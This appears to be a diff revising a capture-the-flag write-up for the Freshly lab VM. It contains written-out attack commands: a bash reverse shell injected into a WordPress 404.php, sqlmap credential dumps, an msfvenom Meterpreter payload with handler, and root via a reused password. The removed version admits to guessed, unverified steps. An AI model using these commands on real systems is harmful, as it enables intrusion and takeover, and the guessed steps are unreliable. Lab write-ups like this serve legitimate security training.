@@ -1,150 +1,138 @@
 # TopHatSec: Freshly — Writeup
 
-<!-- generated from known techniques; verify against live VM -->
-
-| | |
-|-|-|
-| **Target IP** | 192.168.56.X (host-only) |
-| **Difficulty** | Easy–Intermediate |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.112 |
+| **Difficulty** | Easy |
 | **OS** | Linux |
-| **Root Proof** | uid=0(root) |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/tophatsec-freshly,118/) |
+| **Goal** | root access and sensitive file |
+| **Source** | [HackingArticles](http://www.hackingarticles.in/hack-freshly-vm-ctf-challenge/) |
 
 ## Attack Summary
 
-nmap (ports 80 + 8080 + 443) → WordPress on 8080 → `/phpmyadmin` + credentials in config → WordPress admin → plugin/theme upload → PHP reverse shell → SUID `sudo` or writable sudoers → root
+TopHatSec: Freshly runs three web services (ports 80, 443, 8080). Port 80 hosts a login page vulnerable to SQL injection, which yields WordPress admin credentials stored in a secondary database (`wordpress8080`). Port 8080 hosts a WordPress installation. The attacker authenticates to WordPress with the recovered credentials, injects a PHP Meterpreter payload into the theme editor, and uses the WordPress admin password a second time with `su -` to escalate to root.
 
 ## Methodology
 
-1. Network discovery
-2. Multi-port enumeration (80, 443, 8080)
-3. WordPress credential extraction from config or phpMyAdmin
-4. PHP reverse shell via theme editor or plugin upload
-5. Privilege escalation via sudo or SUID
+1. Host discovery — Netdiscover
+2. Multi-port scan — Nmap
+3. Web reconnaissance — Nikto
+4. SQL injection database dump — sqlmap
+5. WordPress admin access and theme editor code injection
+6. Meterpreter reverse shell via msfvenom + Metasploit handler
+7. Privilege escalation via password reuse
 
----
-
-## Step 1: Network Discovery
-
-```bash
-sudo netdiscover -i eth1 -r 192.168.56.0/24
-nmap -sV -sC -p- 192.168.56.X
-```
-
-Key findings:
-- Port 80: HTTP
-- Port 443: HTTPS
-- Port 8080: WordPress installation
-
----
-
-## Step 2: WordPress Enumeration
-
-Browse to `http://192.168.56.X:8080`. A WordPress site is running.
-
-Enumerate with wpscan:
+## Step 1: Host Discovery and Port Scanning
 
 ```bash
-wpscan --url http://192.168.56.X:8080 -e u,vp
+netdiscover -r 192.168.1.0/24
+nmap -p- -A 192.168.1.112
 ```
 
-Check for phpMyAdmin:
+Open ports:
+- `80/tcp` — HTTP (login page)
+- `443/tcp` — HTTPS
+- `8080/tcp` — HTTP (WordPress)
+
+![Nmap full-port scan results](images/01-nmap.png)
+
+## Step 2: Web Reconnaissance with Nikto
 
 ```bash
-dirb http://192.168.56.X /usr/share/wordlists/dirb/common.txt
-# Found: /phpmyadmin
+nikto -h http://192.168.1.112
 ```
 
-Also check `wp-config.php` — if accessible, credentials may be read directly. Another path is extracting DB credentials from the phpMyAdmin instance to log into WP admin.
+Nikto identifies `login.php` on port 80 as an attack surface.
 
----
+![Nikto scan output](images/02-nikto.png)
 
-## Step 3: WordPress Admin → PHP Reverse Shell
+## Step 3: SQL Injection with sqlmap
 
-Log in to `http://192.168.56.X:8080/wp-admin`.
-
-Navigate to **Appearance → Theme Editor → 404.php** and inject a PHP reverse shell:
-
-```php
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.1/4444 0>&1'"); ?>
-```
-
-Or upload a malicious plugin:
+Enumerate databases via the login form, using high risk and level settings to maximize detection coverage:
 
 ```bash
-# Create plugin zip with shell.php
-zip plugin.zip shell.php
-# Upload via Plugins → Add New → Upload
+sqlmap -u 'http://192.168.1.112/login.php' --forms --risk=3 --level=5 --dbs
 ```
 
-Start a listener:
+The database `wordpress8080` is identified. Dump its contents:
 
 ```bash
-nc -lvp 4444
+sqlmap -u 'http://192.168.1.112/login.php' --forms -D wordpress8080 --risk=3 --level=3 --dump-all
 ```
 
-Trigger the shell:
+Recovered credentials:
 
-```bash
-curl http://192.168.56.X:8080/?p=404
+```
+Username: admin
+Password: SuperSecretPassword
 ```
 
----
+![sqlmap dumps wordpress8080 credentials](images/03-sqlmap.png)
 
-## Step 4: Stabilize Shell
+## Step 4: WordPress Theme Editor Code Injection
+
+Log in to WordPress at `http://192.168.1.112:8080/wp-admin` using the recovered credentials (`admin` / `SuperSecretPassword`).
+
+Generate a PHP Meterpreter payload:
 
 ```bash
-python -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.132 lport=4444 -f raw
 ```
 
----
+Copy the generated PHP code (from `<?php` through `die()`). In the WordPress admin panel, navigate to:
 
-## Step 5: Privilege Escalation
-
-Check sudo permissions:
-
-```bash
-sudo -l
+```
+Appearance > Theme Editor > 404.php
 ```
 
-Or find SUID binaries:
+Insert the Meterpreter code into `404.php` and save. Trigger the 404 template by navigating to any non-existent WordPress page.
+
+![WordPress theme editor with PHP payload](images/04-wordpress-shell.png)
+
+## Step 5: Start Metasploit Listener and Catch Shell
 
 ```bash
-find / -perm -u=s -type f 2>/dev/null
+msfconsole
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost 192.168.1.132
+set lport 4444
+exploit
 ```
 
-Common escalation paths on this VM:
-- `sudo` with NOPASSWD for a shell command
-- Writable WordPress config that can restart a root-owned service
-- Kernel exploit if no sudo path available
+A Meterpreter session opens. Upgrade to a proper shell:
 
 ```bash
-# If sudo -l shows a writable command:
-sudo <command>
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
 
-# If SUID binary found:
-/path/to/suid_binary
+## Step 6: Privilege Escalation via Password Reuse
 
+The WordPress admin password is reused as the system root password. Run:
+
+```bash
+su -
+# Password: SuperSecretPassword
 id
-# uid=0(root)
-cat /root/flag.txt
+# uid=0(root) gid=0(root)
+cat /root/secret
 ```
 
----
+![Root access and secret file captured](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **Multi-service enumeration** — scan all ports; services on non-standard ports (8080) are often less hardened
-2. **WordPress credentials in `wp-config.php`** — DB credentials reused for admin login is a common misconfiguration
-3. **Theme/plugin editor for RCE** — WordPress admin with write access to theme files = code execution
-4. **phpMyAdmin on public interface** — restrict phpMyAdmin to localhost or VPN-only access
+- SQL injection against login forms yields credentials that can pivot to completely separate services (WordPress on a different port). Credential reuse between the web application database and system accounts is a compounding risk.
+- WordPress's theme editor is a direct PHP code execution interface available to any admin user. It should be disabled in production with the constant `define('DISALLOW_FILE_EDIT', true)` in `wp-config.php`.
+- Password reuse between application accounts and OS accounts means that a credential theft at the application layer immediately becomes a system-level compromise.
+- Running multiple web services on a single host without segmentation broadens the attack surface considerably.
 
 ## Remediation
 
 | Vulnerability | Fix |
 |---|---|
-| WordPress admin → RCE via theme editor | Disable theme/plugin editing in `wp-config.php`: `define('DISALLOW_FILE_EDIT', true)` |
-| Credential reuse (DB → WP admin) | Use distinct, strong credentials for each service |
-| phpMyAdmin publicly accessible | Restrict to `127.0.0.1` in Apache/Nginx config |
-| Weak sudo configuration | Audit `/etc/sudoers` — avoid NOPASSWD entries |
+| SQL injection on login form | Use parameterized queries; never concatenate user input into SQL |
+| WordPress theme editor enabled | Add `define('DISALLOW_FILE_EDIT', true)` to `wp-config.php` |
+| Password reuse between app and OS | Use unique, strong passwords for each service and system account; enforce password managers |
+| Admin credentials in database | Hash passwords with bcrypt or Argon2; rotate credentials after any database dump |
+| Multi-service attack surface | Isolate services to separate VMs or containers; use network segmentation and firewall rules |
